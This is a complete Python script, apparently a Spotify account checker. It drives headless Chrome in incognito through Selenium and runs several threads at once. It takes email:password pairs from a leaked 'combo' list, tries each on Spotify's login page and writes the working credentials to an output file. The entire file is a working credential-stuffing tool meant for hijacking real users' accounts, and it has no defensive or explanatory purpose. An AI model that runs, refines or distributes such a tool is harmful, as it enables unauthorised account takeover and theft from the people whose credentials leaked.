import sys
from threading import Thread
from time import sleep

from selenium import webdriver
from selenium.webdriver.common.by import By

if len(sys.argv) <= 1:
    print("引数を指定してください")
    exit()
else:
    COMBO_PATH = sys.argv[1]
    print("len", len(COMBO_PATH))

maxThreads = 5
if len(sys.argv) >= 3:
    print("スレッド数を指定するモードです")
    maxThreads = int(sys.argv[2])

waitLogin = 1
if len(sys.argv) >= 4:
    print("ログイン待機時間を設定するモードです")
    waitLogin = int(sys.argv[3])

logging = 1
if len(sys.argv) >= 5:
    print("Disabled Logging Mode")
    logging = int(sys.argv[4])

options = webdriver.ChromeOptions()
options.add_argument("--incognito")
options.add_argument('--disable-gpu')
options.add_argument('--disable-extensions')
options.add_argument("--headless")

currentThreads = 0

availableAccounts = []
badAccounts = 0


def log(text):
    if logging == 1:
        print(text)


class Client:
    def __init__(self, user, pw):
        global currentThreads
        currentThreads = currentThreads + 1
        log(f"Threads: {currentThreads}")

        self.driver = webdriver.Chrome(options=options)
        self.driver.implicitly_wait(10)

        self.user = user
        self.pw = pw
        self.check()

    def check(self):
        global currentThreads, badAccounts
        try:
            self.driver.get('https://accounts.spotify.com/ja/login/')
            self.driver.find_element(By.ID, 'login-username').send_keys(self.user)
            self.driver.find_element(By.ID, 'login-password').send_keys(self.pw)
            self.driver.find_element(By.ID, "login-button").click()

            sleep(waitLogin)
            if self.driver.current_url != "https://accounts.spotify.com/ja/status":
                log(f"Failed to log-in account")
                badAccounts = badAccounts + 1
            else:
                print("Success to log-in account!")
                availableAccounts.append(f"{self.user}:{self.pw}")

                with open("./Output.txt", "a") as f:
                    print(f"{self.user}:{self.pw}", file=f)

            self.driver.close()
            currentThreads = currentThreads - 1
            log(f"Threads: {currentThreads}")

        except:
            self.driver.close()
            currentThreads = currentThreads - 1


if __name__ == '__main__':
    with open(COMBO_PATH, "r", encoding="utf-8", errors="ignore") as read:
        for i in read:
            while True:
                if currentThreads <= maxThreads:
                    account = i.strip().split(":")
                    email = account[0]
                    password = account[1]
                    log(f"{i.strip()} => {email}:{password}")
                    Thread(target=Client, args=[email, password]).start()
                    log(f"Thread has started!")
                    break
                else:
                    log(f"Waiting for threading slot")
                    sleep(1)

    while True:
        if currentThreads == 0:
            print("FINISHED!")
            print(f"""
==========RESULT==========
! Success: {len(availableAccounts)}
! Failed: {badAccounts}
! Accounts:""")

            for i in availableAccounts:
                print(i)
            print("=========================")
            break
        else:
            print("Waiting for exiting process")
            sleep(1)